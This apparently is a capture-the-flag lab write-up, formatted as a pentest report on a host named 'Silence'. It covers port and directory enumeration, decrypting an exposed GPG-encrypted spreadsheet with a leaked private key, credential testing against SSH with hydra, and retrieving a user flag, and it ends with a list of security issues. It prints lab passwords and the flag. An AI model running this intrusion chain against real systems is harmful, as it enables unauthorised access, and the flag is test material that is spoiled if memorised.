# Silence – Pentest Report - Web Enumeration, GPG Decryption and SSH Access

## 1. Target Enumeration

A full TCP port scan was performed:

```bash
nmap -p- -T4 10.10.0.25

22/tcp open  ssh
80/tcp open  http
```

Service enumeration was then performed:

```bash
nmap -sV -sC -p22,80 10.10.0.25

22/tcp open  ssh   OpenSSH 10.0p2 Debian
80/tcp open  http  Apache/2.4.68 (Debian)
```

Nmap also detected the HTTP title:

```bash
Adam Ondra
```

## 2. Web Enumeration

The website was retrieved:

```bash
curl -i http://10.10.0.25/
```

The HTML contained the comment:

```bash
<!-- Silence is golden -->
```

Gobuster was used to discover additional Web resources:

```bash
gobuster dir -u http://10.10.0.25 -w ~/work/Pentest/Wordlist/SecLists/Discovery/Web-Content/common.txt -x php,txt,html,bak,old,zip

/hidden   Status: 301 -> /hidden/
```

## 3. Directory Listing and Sensitive Archive

The discovered directory was accessed:

```bash
curl -i http://10.10.0.25/hidden/

stats.zip
```

The archive was downloaded:

```bash
curl -O http://10.10.0.25/hidden/stats.zip

unzip -l stats.zip

ClimbersStats.xlsx.gpg
.hidden-key
```

## 4. GPG Key and File Decryption

The extracted files were identified:

```bash
file silence_stats/.hidden-key silence_stats/ClimbersStats.xlsx.gpg

.hidden-key:            PGP private key block
ClimbersStats.xlsx.gpg: PGP message Public-Key Encrypted Session Key
```

A dedicated GPG keyring was created:

```bash
mkdir -m 700 gnupg
```

The private key was imported:

```bash
GNUPGHOME="$PWD/gnupg" gpg --import silence_stats/.hidden-key

Adam Ondra <adam@climbing.thm>
secret key imported
```

The encrypted Excel file was decrypted:

```bash
GNUPGHOME="$PWD/gnupg" gpg --output ClimbersStats.xlsx --decrypt silence_stats/ClimbersStats.xlsx.gpg

Adam Ondra <adam@climbing.thm>
```

## 5. Credential Discovery

The XLSX file was inspected through its internal XML files:

```bash
unzip -p ClimbersStats.xlsx xl/sharedStrings.xml | sed 's/<[^>]*>/\n/g' | sed '/^[[:space:]]*$/d'
```

Credentials discovered:

```bash
adam   : bibliographieSeemsTough2022
magnus : youtubeIsClimbingToo
janja  : theClimbingMonster
```

## 6. SSH Credential Validation

The discovered credentials were stored as `login:password` pairs:

```bash
printf '%s\n' \
'adam:bibliographieSeemsTough2022' \
'magnus:youtubeIsClimbingToo' \
'janja:theClimbingMonster' \
> creds.txt
```

They were tested against SSH:

```bash
hydra -C creds.txt -f ssh://10.10.0.25
```

Parameters:

* `-C creds.txt`: tests exact `login:password` pairs.
* `-f`: stops after the first valid pair is found.

Valid SSH credentials:

```bash
Username: janja
Password: theClimbingMonster
```

## 7. SSH Access

The target was accessed through SSH:

```bash
ssh janja@10.10.0.25

whoami
pwd

janja
/home/janja
```

The home directory was enumerated:

```bash
ls -la

/home/janja/user.txt

cat user.txt
```

Flag:

```bash
EPI{4d4M_0ndr4_Ch4n93_9b+}
```

## Attack Path Summary

```bash
Nmap enumeration
        ↓
HTTP service discovered
        ↓
Gobuster enumeration
        ↓
/hidden/ discovered
        ↓
Apache directory listing
        ↓
stats.zip exposed
        ↓
PGP private key recovered
        ↓
ClimbersStats.xlsx.gpg decrypted
        ↓
Credentials recovered
        ↓
SSH credentials validated
        ↓
janja
        ↓
/home/janja/user.txt
        ↓
User flag retrieved
```

## Main Security Issues Identified

1. Apache directory listing enabled on `/hidden/`.
2. Sensitive archive publicly accessible.
3. Private OpenPGP key exposed.
4. Credentials stored in clear text inside an Excel file.
5. Valid system credentials reusable for SSH access.